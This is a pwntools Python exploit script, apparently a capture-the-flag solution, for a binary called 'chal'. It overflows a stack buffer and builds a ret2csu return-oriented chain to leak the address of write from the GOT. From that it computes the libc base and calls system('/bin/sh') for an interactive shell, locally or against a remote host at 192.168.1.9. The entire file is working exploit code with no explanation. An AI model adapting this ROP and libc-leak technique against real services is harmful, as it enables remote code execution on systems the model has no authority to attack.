from pwn import *
from sys import argv

context.update(arch='amd64', os='linux', terminal=['tmux','splitw','-h'])
elf = ELF('./chal')

"""gadget1
   0x00000000004013ea <+90>:	pop    rbx
   0x00000000004013eb <+91>:	pop    rbp
   0x00000000004013ec <+92>:	pop    r12
   0x00000000004013ee <+94>:	pop    r13
   0x00000000004013f0 <+96>:	pop    r14
   0x00000000004013f2 <+98>:	pop    r15
   0x00000000004013f4 <+100>:	ret 
"""

"""gadget2
   0x00000000004013d0 <+64>:	mov    rdx,r14
   0x00000000004013d3 <+67>:	mov    rsi,r13
   0x00000000004013d6 <+70>:	mov    edi,r12d
   0x00000000004013d9 <+73>:	call   QWORD PTR [r15+rbx*8]
"""

def gadget1(rbx,rbp,r12,r13,r14,r15):
	return p64(0x00000000004013ea)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)

def gadget2():
	return p64(0x00000000004013d0)

def pop_rdi(what):
	return p64(0x00000000004013f3) + p64(what)

def ret():
	return p64(0x000000000040101a)

def leak_libc(p):
	payload = b'A'*56
	payload += gadget1(0, 1, 1, elf.got['write'], 8, elf.got['write'])
	payload += gadget2()
	payload += p64(0) # add rsp, 0x8
	payload += p64(0)*6
	payload += p64(elf.sym['main'])

	p.recvuntil('String 1: ')
	p.sendline('A'*0x20+'\xff')
	p.recvuntil('String 2: ')
	p.sendline(payload)
	p.recvuntil('match\n')
	return p.recv(8)

def pwn(p, system_address, str_bin_sh_address):
	payload = b'A'*56
	payload += ret()
	payload += pop_rdi(str_bin_sh_address)
	payload += p64(system_address)
	p.recvuntil('String 1: ')
	p.sendline('A'*0x20+'\xff')
	p.recvuntil('String 2: ')
	p.sendline(payload)
	p.recvuntil('match\n')

def __main__():
	if('local' in argv):
		p = process('./chal')
		WRITE_OFFSET = 0x1111d0
		SYSTEM_OFFSET = 0x055410
		STR_BIN_SH_OFFSET = 0x1b75aa
	else:
		p = remote('192.168.1.9', 22222)
		WRITE_OFFSET = 0x1111d0
		SYSTEM_OFFSET = 0x055410
		STR_BIN_SH_OFFSET = 0x1b75aa

	if('gdb' in argv):
		gdbscript = '''
			b *0x0000000000401331
			b *0x0000000000401389
			continue
		'''
		gdb.attach(p, gdbscript)

	WRITE_GOT = u64(leak_libc(p))
	LIBC_BASE = WRITE_GOT-WRITE_OFFSET
	log.info('WRITE_GOT: {}'.format(hex(WRITE_GOT)))
	log.info('LIBC_BASE: {}'.format(hex(LIBC_BASE)))

	pwn(p, LIBC_BASE + SYSTEM_OFFSET, LIBC_BASE + STR_BIN_SH_OFFSET)

	p.interactive()

__main__()